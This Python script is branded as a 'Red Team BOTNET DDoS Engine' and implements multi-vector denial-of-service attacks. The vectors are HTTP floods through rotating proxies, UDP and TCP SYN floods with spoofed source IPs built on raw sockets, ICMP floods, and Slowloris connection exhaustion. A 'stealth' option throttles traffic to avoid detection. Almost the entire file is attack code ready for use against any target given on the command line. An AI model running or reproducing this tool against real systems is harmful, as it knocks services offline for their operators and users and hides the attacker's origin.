import socket
import threading
import time
import sys
import random
import logging
import argparse
import struct
import urllib.request
from urllib.parse import urlparse
from colorama import Fore, Style, init
import time

init(autoreset=True)

def banner():
    print(Fore.BLUE + Style.BRIGHT + r"""
   ██████╗   ██████╗ ████████╗███╗   ██╗ ███████╗████████╗
   ██╔══██╗ ██╔═══██╗╚══██╔══╝████╗  ██║ ██╔════╝╚══██╔══╝
   ██████╔╝ ██║   ██║   ██║   ██╔██╗ ██║ █████╗     ██║   
   ██╔══██╗║██║   ██║   ██║   ██║╚██╗██║ ██╔══╝     ██║   
   ██████╔╝ ╚██████╔╝   ██║   ██║ ╚████║ ███████╗   ██║   
   ╚═════╝   ╚═════╝    ╚═╝   ╚═╝  ╚═══╝ ╚══════╝   ╚═╝   
    """)

    print(Fore.CYAN + Style.BRIGHT + "              ⇢  Red Team BOTNET DDoS Engine  ⇠")
    print(Fore.MAGENTA + "    ⚔️  Spoofing | Proxy Rotation | DNS Resolver | Stealth Mode  ⚔️")
    print(Fore.YELLOW + f"\n                 Author: {Fore.GREEN}Mr. Qureshi \n")
    print(Style.DIM + "-" * 60)

def launcher():
    banner()
    time.sleep(0.5)
    print(Fore.CYAN + "[*] Initializing modules...")
    time.sleep(0.5)
    print(Fore.GREEN + "[+] All systems online.")
    time.sleep(0.3)
    print(Fore.YELLOW + "[>] Launching Botnet attack interface...\n")
    time.sleep(0.5)

launcher()
    # from ddos_engine import main
    # main()



logging.basicConfig(level=logging.INFO, format="[%(asctime)s] %(levelname)s: %(message)s")
logger = logging.getLogger()

# Global counters and locks
success_count = 0
error_count = 0
success_lock = threading.Lock()
error_lock = threading.Lock()
stop_event = threading.Event()

# Proxy Manager
class ProxyManager:
    def __init__(self, proxies):
        self.proxies = proxies
        self.lock = threading.Lock()
        self.index = 0

    def get_next(self):
        with self.lock:
            if not self.proxies:
                return None
            proxy = self.proxies[self.index]
            self.index = (self.index + 1) % len(self.proxies)
            return proxy

    def validate_and_clean(self):
        logger.info("Validating proxies...")
        alive = []
        for proxy in self.proxies:
            try:
                if ':' not in proxy:
                    logger.warning(f"Proxy {proxy} format invalid, skipping.")
                    continue
                host, port = proxy.split(":")
                port = int(port)
                s = socket.create_connection((host, port), timeout=3)
                s.close()
                alive.append(proxy)
            except Exception:
                logger.warning(f"Proxy {proxy} dead or unreachable, removing.")
        with self.lock:
            self.proxies = alive
        logger.info(f"{len(self.proxies)} proxies alive after validation.")

# DNS Resolver with fallback
def resolve_target(target):
    try:
        ip = socket.gethostbyname(target)
        return ip
    except Exception:
        logger.warning("Primary DNS resolver failed, trying fallback...")
        try:
            return fallback_dns_resolve(target)
        except Exception as e:
            logger.error(f"DNS resolution failed: {e}")
            sys.exit(1)

def fallback_dns_resolve(domain):
    query = build_dns_query(domain)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)
    sock.sendto(query, ("8.8.8.8", 53))
    data, _ = sock.recvfrom(512)
    ip = parse_dns_response(data)
    sock.close()
    return ip

def build_dns_query(domain):
    ID = random.randint(0, 65535)
    flags = 0x0100
    qdcount = 1
    ancount = 0
    nscount = 0
    arcount = 0
    header = struct.pack(">HHHHHH", ID, flags, qdcount, ancount, nscount, arcount)
    parts = domain.split(".")
    qname = b"".join(len(p).to_bytes(1, 'big') + p.encode() for p in parts) + b"\x00"
    qtype = 1
    qclass = 1
    question = qname + struct.pack(">HH", qtype, qclass)
    return header + question

def parse_dns_response(data):
    qdcount = struct.unpack(">H", data[4:6])[0]
    pos = 12
    for _ in range(qdcount):
        while data[pos] != 0:
            pos += data[pos] + 1
        pos += 5
    ancount = struct.unpack(">H", data[6:8])[0]
    if ancount == 0:
        raise Exception("No DNS answer")
    for _ in range(ancount):
        pos += 2
        rtype = struct.unpack(">H", data[pos:pos+2])[0]
        pos += 8
        rdlength = struct.unpack(">H", data[pos-2:pos])[0]
        if rtype == 1:
            ip = ".".join(str(b) for b in data[pos:pos+rdlength])
            return ip
        pos += rdlength
    raise Exception("No A record found")

# Payload randomization
def random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Linux x86_64)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
        "Mozilla/5.0 (Android 11; Mobile; rv:87.0)",
    ]
    return random.choice(user_agents)

def random_headers():
    return {
        "User-Agent": random_user_agent(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
    }

def random_query_string():
    length = random.randint(5, 15)
    chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    return ''.join(random.choice(chars) for _ in range(length))

# HTTP Flood
def http_flood(target_url, use_proxy, test_mode, stealth):
    global success_count, error_count
    logger.info(f"HTTP flood started on {target_url} with proxy={use_proxy}")
    while not stop_event.is_set():
        try:
            url = target_url
            if '?' in url:
                url += "&" + random_query_string() + "=" + random_query_string()
            else:
                url += "?" + random_query_string() + "=" + random_query_string()
            headers = random_headers()
            req = urllib.request.Request(url, headers=headers)
            if test_mode:
                logger.debug("HTTP flood test mode: Simulated request")
            else:
                if use_proxy:
                    proxy = PROXY_MANAGER.get_next()
                    if proxy:
                        proxy_handler = urllib.request.ProxyHandler({"http": proxy, "https": proxy})
                        opener = urllib.request.build_opener(proxy_handler)
                        urllib.request.install_opener(opener)
                with urllib.request.urlopen(req, timeout=5) as response:
                    response.read(100)
            with success_lock:
                success_count += 1
        except Exception as e:
            with error_lock:
                error_count += 1
            logger.debug(f"HTTP flood error: {e}")
        if stealth:
            time.sleep(random.uniform(0.1, 0.4))

# UDP Flood
def udp_flood(target_ip, port, test_mode, stealth, spoof=False):
    global success_count, error_count
    logger.info(f"UDP flood started on {target_ip}:{port} with spoof={spoof}")
    if spoof:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except Exception:
            logger.error("Raw socket creation failed (need root/admin). Exiting UDP flood with spoof.")
            return
    else:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def checksum(msg):
        s = 0
        for i in range(0, len(msg), 2):
            w = (msg[i] << 8) + (msg[i+1] if i+1 < len(msg) else 0)
            s += w
        s = (s >> 16) + (s & 0xffff)
        s += (s >> 16)
        s = ~s & 0xffff
        return s

    def build_ip_header(source_ip, dest_ip, payload_len):
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 20 + 8 + payload_len
        ip_id = random.randint(0, 65535)
        ip_frag_off = 0
        ip_ttl = 64
        ip_proto = socket.IPPROTO_UDP
        ip_check = 0
        ip_saddr = socket.inet_aton(source_ip)
        ip_daddr = socket.inet_aton(dest_ip)

        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        ip_header = struct.pack('!BBHHHBBH4s4s',
                                ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off,
                                ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
        ip_check = checksum(ip_header)
        ip_header = struct.pack('!BBHHHBBH4s4s',
                                ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off,
                                ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
        return ip_header

    def build_udp_header(source_port, dest_port, length):
        udp_length = 8 + length
        udp_check = 0
        udp_header = struct.pack('!HHHH', source_port, dest_port, udp_length, udp_check)
        return udp_header

    while not stop_event.is_set():
        try:
            data = random._urandom(1024)
            if spoof:
                source_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
                ip_header = build_ip_header(source_ip, target_ip, len(data))
                udp_header = build_udp_header(random.randint(1024, 65535), port, len(data))
                packet = ip_header + udp_header + data
                sock.sendto(packet, (target_ip, 0))
            else:
                if test_mode:
                    logger.debug("UDP flood test mode: Simulated packet send")
                else:
                    sock.sendto(data, (target_ip, port))
            with success_lock:
                success_count += 1
        except Exception as e:
            with error_lock:
                error_count += 1
            logger.debug(f"UDP flood error: {e}")
        if stealth:
            time.sleep(random.uniform(0.05, 0.2))
    sock.close()

# TCP SYN Flood
def tcp_syn_flood(target_ip, port, test_mode, stealth, spoof=False):
    global success_count, error_count
    logger.info(f"TCP SYN flood started on {target_ip}:{port} with spoof={spoof}")

    def checksum(msg):
        s = 0
        for i in range(0, len(msg), 2):
            w = (msg[i] << 8) + (msg[i+1] if i+1 < len(msg) else 0)
            s += w
        s = (s >> 16) + (s & 0xffff)
        s += (s >> 16)
        s = ~s & 0xffff
        return s

    def build_ip_header(source_ip, dest_ip):
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 40  # IP header + TCP header (20+20)
        ip_id = random.randint(0, 65535)
        ip_frag_off = 0
        ip_ttl = 64
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(source_ip)
        ip_daddr = socket.inet_aton(dest_ip)

        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        ip_header = struct.pack('!BBHHHBBH4s4s',
                                ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off,
                                ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
        ip_check = checksum(ip_header)
        ip_header = struct.pack('!BBHHHBBH4s4s',
                                ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off,
                                ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
        return ip_header

    def build_tcp_header(source_ip, dest_ip, source_port, dest_port):
        seq = 0
        ack_seq = 0
        doff = 5
        fin = 0
        syn = 1
        rst = 0
        psh = 0
        ack = 0
        urg = 0
        window = socket.htons(5840)
        check = 0
        urg_ptr = 0
        offset_res = (doff << 4) + 0
        flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)

        tcp_header = struct.pack('!HHLLBBHHH', source_port, dest_port, seq, ack_seq, offset_res, flags, window, check, urg_ptr)

        # Pseudo header fields for checksum calculation
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)

        pseudo_header = struct.pack('!4s4sBBH', socket.inet_aton(source_ip), socket.inet_aton(dest_ip), placeholder, protocol, tcp_length)
        psh = pseudo_header + tcp_header
        tcp_checksum = checksum(psh)

        tcp_header = struct.pack('!HHLLBBH', source_port, dest_port, seq, ack_seq, offset_res, flags, window) + struct.pack('H', tcp_checksum) + struct.pack('!H', urg_ptr)
        return tcp_header

    try:
        if spoof:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
    except Exception:
        logger.error("Raw socket creation failed (need root/admin). Exiting TCP SYN flood with spoof.")
        return

    while not stop_event.is_set():
        try:
            if spoof:
                source_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
                source_port = random.randint(1024, 65535)
                ip_header = build_ip_header(source_ip, target_ip)
                tcp_header = build_tcp_header(source_ip, target_ip, source_port, port)
                packet = ip_header + tcp_header
                sock.sendto(packet, (target_ip, 0))
            else:
                if test_mode:
                    logger.debug("TCP SYN flood test mode: Simulated SYN send")
                else:
                    sock.connect((target_ip, port))
                    sock.shutdown(socket.SHUT_RDWR)
            with success_lock:
                success_count += 1
        except Exception as e:
            with error_lock:
                error_count += 1
            logger.debug(f"TCP SYN flood error: {e}")
        if stealth:
            time.sleep(random.uniform(0.05, 0.3))
    sock.close()

# ICMP Flood
def icmp_flood(target_ip, test_mode, stealth):
    global success_count, error_count
    logger.info(f"ICMP flood started on {target_ip}")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except Exception:
        logger.error("ICMP raw socket creation failed (need root/admin). Exiting ICMP flood.")
        return

    def checksum(source_string):
        sum = 0
        countTo = (len(source_string) // 2) * 2
        count = 0
        while count < countTo:
            thisVal = source_string[count + 1] * 256 + source_string[count]
            sum = sum + thisVal
            sum = sum & 0xffffffff
            count = count + 2
        if countTo < len(source_string):
            sum = sum + source_string[len(source_string) - 1]
            sum = sum & 0xffffffff
        sum = (sum >> 16) + (sum & 0xffff)
        sum = sum + (sum >> 16)
        answer = ~sum
        answer = answer & 0xffff
        answer = answer >> 8 | (answer << 8 & 0xff00)
        return answer

    while not stop_event.is_set():
        try:
            icmp_type = 8
            code = 0
            checksum_val = 0
            packet_id = random.randint(0, 65535)
            sequence = 1
            header = struct.pack('bbHHh', icmp_type, code, checksum_val, packet_id, sequence)
            payload = random._urandom(1024)
            checksum_val = checksum(header + payload)
            header = struct.pack('bbHHh', icmp_type, code, socket.htons(checksum_val), packet_id, sequence)
            packet = header + payload
            if test_mode:
                logger.debug("ICMP flood test mode: Simulated packet send")
            else:
                sock.sendto(packet, (target_ip, 1))
            with success_lock:
                success_count += 1
        except Exception as e:
            with error_lock:
                error_count += 1
            logger.debug(f"ICMP flood error: {e}")
        if stealth:
            time.sleep(random.uniform(0.05, 0.2))
    sock.close()

# Slowloris Flood
def slowloris_flood(target_ip, port, test_mode, stealth):
    global success_count, error_count
    logger.info(f"Slowloris flood started on {target_ip}:{port}")
    sockets = []

    def create_socket():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, port))
            s.send(b"GET /?{} HTTP/1.1\r\n".format(random_query_string().encode()))
            s.send(b"User-Agent: {}\r\n".format(random_user_agent().encode()))
            s.send(b"Accept-language: en-US,en,q=0.5\r\n")
            return s
        except Exception as e:
            return None

    while not stop_event.is_set():
        try:
            while len(sockets) < 200:
                s = create_socket()
                if s:
                    sockets.append(s)
                    with success_lock:
                        success_count += 1
            for s in sockets:
                try:
                    s.send(b"X-a: {}\r\n".format(random_query_string().encode()))
                except Exception:
                    sockets.remove(s)
                    s.close()
            time.sleep(15 if stealth else 1)
        except Exception as e:
            with error_lock:
                error_count += 1
            time.sleep(1)
    for s in sockets:
        s.close()

# Main function to parse args and launch threads
def main():
    parser = argparse.ArgumentParser(description="Unified DDoS Tool")
    parser.add_argument("target", help="Target IP or URL")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port (default 80)")
    parser.add_argument("-t", "--threads", type=int, default=100, help="Number of threads")
    parser.add_argument("--http", action="store_true", help="Enable HTTP flood")
    parser.add_argument("--udp", action="store_true", help="Enable UDP flood")
    parser.add_argument("--tcp", action="store_true", help="Enable TCP SYN flood")
    parser.add_argument("--icmp", action="store_true", help="Enable ICMP flood")
    parser.add_argument("--slowloris", action="store_true", help="Enable Slowloris flood")
    parser.add_argument("--proxyfile", help="File with proxy list")
    parser.add_argument("--useproxy", action="store_true", help="Use proxies for HTTP flood")
    parser.add_argument("--testmode", action="store_true", help="Enable test mode (no real attack)")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode (adds delays)")
    parser.add_argument("--spoofer", action="store_true", help="Enable IP spoofing (requires root/admin)")
    args = parser.parse_args()

    global PROXY_MANAGER

    target_ip = args.target
    # If URL, parse domain
    if args.target.startswith("http://") or args.target.startswith("https://"):
        parsed = urlparse(args.target)
        target_ip = resolve_target(parsed.hostname)
    else:
        try:
            socket.inet_aton(args.target)
        except socket.error:
            target_ip = resolve_target(args.target)

    proxies = []
    if args.proxyfile:
        try:
            with open(args.proxyfile, "r") as f:
                proxies = [line.strip() for line in f if line.strip()]
        except Exception:
            logger.error("Failed to read proxy file")
            sys.exit(1)

    PROXY_MANAGER = ProxyManager(proxies)
    if proxies:
        PROXY_MANAGER.validate_and_clean()

    logger.info(f"Target IP resolved: {target_ip}")

    threads = []

    # Start HTTP flood threads
    if args.http:
        for _ in range(args.threads):
            t = threading.Thread(target=http_flood, args=(args.target, args.useproxy, args.testmode, args.stealth))
            t.daemon = True
            threads.append(t)
            t.start()

    # Start UDP flood threads
    if args.udp:
        for _ in range(args.threads):
            t = threading.Thread(target=udp_flood, args=(target_ip, args.port, args.testmode, args.stealth, args.spoofer))
            t.daemon = True
            threads.append(t)
            t.start()

    # Start TCP SYN flood threads
    if args.tcp:
        for _ in range(args.threads):
            t = threading.Thread(target=tcp_syn_flood, args=(target_ip, args.port, args.testmode, args.stealth, args.spoofer))
            t.daemon = True
            threads.append(t)
            t.start()

    # Start ICMP flood threads
    if args.icmp:
        for _ in range(args.threads):
            t = threading.Thread(target=icmp_flood, args=(target_ip, args.testmode, args.stealth))
            t.daemon = True
            threads.append(t)
            t.start()

    # Start Slowloris flood threads
    if args.slowloris:
        for _ in range(args.threads):
            t = threading.Thread(target=slowloris_flood, args=(target_ip, args.port, args.testmode, args.stealth))
            t.daemon = True
            threads.append(t)
            t.start()

    try:
        while True:
            time.sleep(10)
            logger.info(f"Success: {success_count} | Errors: {error_count}")
    except KeyboardInterrupt:
        logger.info("Stopping all threads...")
        stop_event.set()
        for t in threads:
            t.join()
        logger.info("Stopped.")

if __name__ == "__main__":
    main()
